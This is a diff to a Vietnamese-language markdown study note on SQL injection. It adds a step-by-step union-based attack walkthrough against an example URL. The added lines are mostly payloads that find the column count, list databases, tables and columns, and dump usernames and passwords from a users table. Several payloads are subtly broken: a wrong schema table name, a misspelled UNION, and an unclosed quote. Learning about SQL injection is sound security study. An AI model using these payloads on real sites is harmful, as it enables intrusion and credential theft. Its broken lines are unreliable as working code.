@@ -21,11 +21,17 @@ SQL injection (SQLi) là một kỹ thuật tấn công mạng nguy hiểm, tron
 3. SQL xảy ra ở câu truy vấn UPDATE và DELETE
   + Ở trường hợp này nhất định đừng sài tool vì nó có thể dẫn đến mất toàn bộ dữ liệu hệ thống
 #### Khai thác Union
-- Xác định số cột
-  <img width="1095" height="78" alt="image" src="https://github.com/user-attachments/assets/ad73f4d4-7c1f-4c9c-9c06-d4687ce5c074" />
-- Tìm kiếm tên bảng, tìm kiếm tên cột
-  Ở những version mySQL hiện nay chúng ta có 1 table chứa toàn bộ thông tin này đó là `information_schema.tables` hoặc nếu là sql khác thì search gg nhé =))
-  <img width="1342" height="95" alt="image" src="https://github.com/user-attachments/assets/ad2b7638-6049-470a-96aa-e1843733de0e" />
-
-- Khai Thác dữ liệu
-
+- Giả sử có url: `http://target.com/page.php?id=1` thì ta sẽ có payload `?id=1 UNION SELECT 1,2,3--`
+- Quy trình dùng union select để attack
+  1. Xác định số cột
+    + Dùng Order by để thử ?id=1 ORDER BY 3-- ✅ ?id=1 ORDER BY 4-- ❌ (lỗi) -> có 3 cột
+  2. Tìm cột hiển thị ra ngoài
+    + Dùng ?id=-1 UNION SELECT 1,2,3-- nếu trang hiện ra số 2 -> cột 2 show content ra
+  3. Trích xuất thông tin từ DB
+    + Lấy DB hiện tại: `?id=-1 union select 1,database(),3--`
+    + Lấy tên tất cả DB: `?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata--`
+    + Lấy bảng của DB hiện tại: `?id=-1 union select 1,group_concat(table_name),3 from information.tables where table_schema=database()--`
+    + Lấy cột từ bảng cụ thể: `?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users--`
+    + Dump dữ liệu: `?id=-1 uinion select 1,group_concat(username,0x3a,password),3 from users--`
+#### Inference SQL Injection
+1. Boolean
